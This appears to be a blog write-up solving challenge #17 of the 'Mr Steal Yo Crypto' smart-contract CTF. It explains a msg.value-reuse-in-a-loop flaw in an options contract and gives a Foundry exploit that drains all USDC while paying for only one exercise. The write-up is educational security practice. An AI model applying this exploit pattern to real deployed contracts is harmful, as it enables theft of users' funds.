---
title: "Mr Steal Yo Crypto — Opyn Sesame"
date: 2023-07-22
draft: false
description: "CTF - 17"
tags: ["CTF"]
series: ["CTF"]
series_order: 17
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---

This is the #17 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real world exploits.

Created by [@0xToshii](https://twitter.com/0xToshii).

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement).

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/freeze/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Opyn Sesame

There’s an OptionsContract which allows users to issue ETH-USDC put options. It represents the premium for a given series of options as an ERC20 token, allowing for AMM pricing and liquidity.

So far 5 users have used the contract and sold put options.

Your task is to take all the USDC from the contract.

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/opyn-sesame)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/17-opyn-sesame.sol)

## Review of the contracts

### OptionsContract.sol

It implements the logic of OptionLogic.sol and adds a function for creating a vault, sends USDC as collateral, sells the freshly minted oTokens to the market contract. This function is used by users who want to issue ETH-USDC put options. Nothing interesting for the moment.

### OptionsMarket.sol

The only function callable by us is `purchase()`. With this function, we are able to buy `n` amount of oTokens for `n * price` of USDC (the `setPrice` is defined by the owner). Nothing interesting for the moment.

### Test file and OptionLogic.sol

This time, I tried something new. We want to take all the USDC from the contract. I decided to do the reverse method. Start from where USDC is transferred to the user and go back to the original function that the user called. The function where we transfer USDC to the user is `transferCollateral()`, let’s start our research.

The function is used in `redeemVaultBalance()`, if we want `collateralToTransfer` very high. We need `vault.collateral` also high. The only time where `vault.collateral` is updated (increasing) is in `addERC20Collateral()`. However, before we can set `vault.collateral` as a high value, we need to send a big amount of USDC before. To conclude, this is not possible.

The function `transferCollateral()` is also called in `_exercice()`.

To make it quicker, before getting some USDC, we need to burn some oTokens and send enough ether for passing the requirement at [L299](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/src/opyn-sesame/OptionsLogic.sol).

`_exercice()` is called in `exercice()` and WAIT! `_exercice()` is called inside a loop. It means it’s the same vulnerability as challenge #16!?

## The Vulnerability

The contract has a vulnerability similar to the one in challenge #16 — Extractoor. If we have a function that is payable, makes a loop, and has `msg.value`, there is a vulnerability.

## Exploit the vulnerability

This is certainly the same type of exploit as challenge #16 — Extractoor.

If we are able to loop with the same `msg.value` through `exercise()`, then we can drain the USDC one more time:

1. Buy as much oTokens as we can (5e18). Is 5e18 enough? Yes, because every vault has only 1e18 oTokens.
2. Call `exercise()` and exercise the option on all current vaults. As we are in a loop inside `exercise()`, the `msg.value` at [L299](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/src/opyn-sesame/OptionsLogic.sol) will always be the amount of value that we are sending.
3. We are able to exercise options without paying the execution with ether (we bypass [L299](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/src/opyn-sesame/OptionsLogic.sol)). That’s how we are able to take all the USDC.

Here is a quick solution:

```solidity
// solves the challenge
function testChallengeExploit() public {
    vm.startPrank(attacker, attacker);

    // implement solution here
    usdc.approve(address(optionsMarket), 500e18);

    // Buy oTokens as much as we can
    optionsMarket.purchase(5e18);

    console.log("amount of oTokens for vault_1:", optionsContract.maxOTokensIssuable(2_000e18));
    // Each vault has 1e18 oTokens and we bought 5e18 oTokens, we are good

    uint256 value = optionsContract.underlyingRequiredToExercise(1e18);
    // For 1e18 oTokens exercise, we need to send 1 ether

    value = optionsContract.underlyingRequiredToExercise(5e18);
    console.log("amount of ether that we need to send:", value);
    // For 5e18 oTokens exercise, we need to send 5 ether

    // However, `exercise()` uses a loop for exercising the 5e18 oTokens (1e18 per vault), so we can send only 1 ether
    // With only 1 ether, we will exercise 5e18 oTokens and thus get all the USDC
    optionsContract.exercise{value: 1 ether}(5e18, addresses);

    vm.stopPrank();
    validation();
}
```

You can check my test file [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/17

-opyn-sesame.sol).

Honestly, I was lucky for this challenge. If I didn’t do the challenge #16, I don’t think that I would have found a solution so "easily". I can add that I didn’t deep dive into the oTokens logic around their price and how I’m able to “bypass” the `_burn`.

## Acknowledgement

Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me to write articles on CTF ^^.
